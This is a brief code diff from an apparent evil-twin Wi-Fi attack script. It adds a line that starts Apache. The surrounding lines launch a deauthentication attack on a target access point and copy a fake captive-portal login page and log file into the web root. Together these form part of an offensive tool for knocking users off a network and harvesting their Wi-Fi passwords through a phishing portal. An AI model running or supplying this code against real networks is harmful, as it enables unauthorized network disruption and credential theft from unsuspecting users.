@@ -60,6 +60,7 @@ if __name__ == '__main__':
     os.system("gnome-terminal -x python3 helper_files/my_deauth.py " + target_AP_BSSID + " " + monitor_interface1 + " " + target_AP_name)
 
     ##------------------------ step 7 captive portal ----------------------------------------##
+    os.system("service apache2 start")
     os.system("cp login_page_files/log.txt /var/www/html/")
     os.system("cp login_page_files/index.html /var/www/html/")
     os.system("cp login_page_files/login.php /var/www/html/")
